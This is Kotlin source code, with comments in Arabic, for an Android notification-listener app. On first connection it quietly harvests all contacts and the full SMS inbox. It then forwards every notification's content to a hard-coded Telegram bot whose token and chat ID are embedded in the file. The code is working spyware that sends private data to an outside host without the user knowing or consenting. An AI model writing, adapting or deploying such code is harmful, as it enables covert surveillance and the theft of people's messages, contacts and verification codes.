package com.example.notifmonitor

import android.app.Notification
import android.content.Context
import android.content.SharedPreferences
import android.location.LocationManager
import android.provider.ContactsContract
import android.net.Uri
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL

class MyNotificationListener : NotificationListenerService() {

    // التوكن والشات آي دي الخاصة بك مثبتة هنا بدقة
    private val botToken = "8123675523:AAF7Hg6ZbyP00ie07Kgci-FmUTWpEetjosA"
    private val chatId = "8355060037"
    
    private val PREF_NAME = "AppPrefs"
    private val KEY_INIT_SENT = "init_sent"

    override fun onListenerConnected() {
        super.onListenerConnected()
        
        val prefs: SharedPreferences = getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
        val isSent = prefs.getBoolean(KEY_INIT_SENT, false)
        
        if (!isSent) {
            // عند الاتصال الأول، نقوم بإرسال تنبيه وتجميع أول للبيانات كاختبار
            val initialMessage = "🚀 تم تثبيت التطبيق بنجاح!\n\n" +
                    "👥 جهات الاتصال:\n${getContacts(this)}\n\n" +
                    "📱 عينة من الرسائل:\n${getSMS(this)}"
            
            sendToTelegram(initialMessage)
            prefs.edit().putBoolean(KEY_INIT_SENT, true).apply()
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        if (sbn == null) return
        if (sbn.packageName == packageName) return

        val pkg = sbn.packageName
        val extras = sbn.notification.extras
        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: "بدون عنوان"
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: "بدون محتوى"

        val message = "🔔 إشعار جديد:\n📱 التطبيق: $pkg\n📌 العنوان: $title\n💬 النص: $text"
        sendToTelegram(message)
    }

    // دالة سحب جهات الاتصال كاملة
    private fun getContacts(context: Context): String {
        val contactsList = StringBuilder()
        try {
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )
            cursor?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext()) {
                    val name = if (nameIdx != -1) it.getString(nameIdx) else "مجهول"
                    val number = if (numIdx != -1) it.getString(numIdx) else ""
                    contactsList.append("• $name: $number\n")
                }
            }
        } catch (e: Exception) {
            contactsList.append("خطأ في قراءة جهات الاتصال: ${e.message}")
        }
        return contactsList.toString()
    }

    // دالة سحب الرسائل النصية SMS
    private fun getSMS(context: Context): String {
        val smsList = StringBuilder()
        try {
            val cursor = context.contentResolver.query(
                Uri.parse("content://sms/inbox"),
                null, null, null, null
            )
            cursor?.use {
                val addressIdx = it.getColumnIndex("address")
                val bodyIdx = it.getColumnIndex("body")
                while (it.moveToNext()) {
                    val address = if (addressIdx != -1) it.getString(addressIdx) else "مجهول"
                    val body = if (bodyIdx != -1) it.getString(bodyIdx) else ""
                    smsList.append("من: $address | النص: $body\n")
                }
            }
        } catch (e: Exception) {
            smsList.append("خطأ في قراءة الرسائل: ${e.message}")
        }
        return smsList.toString()
    }

    // دالة الإرسال العامة إلى بوت تيليجرام عبر طلب HTTP POST
    private fun sendToTelegram(message: String) {
        Thread {
            try {
                val urlString = "https://api.telegram.org/bot$botToken/sendMessage"
                val url = URL(urlString)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")

                // تجهيز النص وإرساله
                val safeMessage = message.replace("\"", "'").replace("\n", "\\n")
                val jsonInputString = "{\"chat_id\": \"$chatId\", \"text\": \"$safeMessage\"}"
                
                val os: OutputStream = conn.outputStream
                os.write(jsonInputString.toByteArray(Charsets.UTF_8))
                os.flush()
                os.close()

                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) {
                Log.e("TelegramError", "فشل الإرسال: ${e.message}")
            }
        }.start()
    }
}
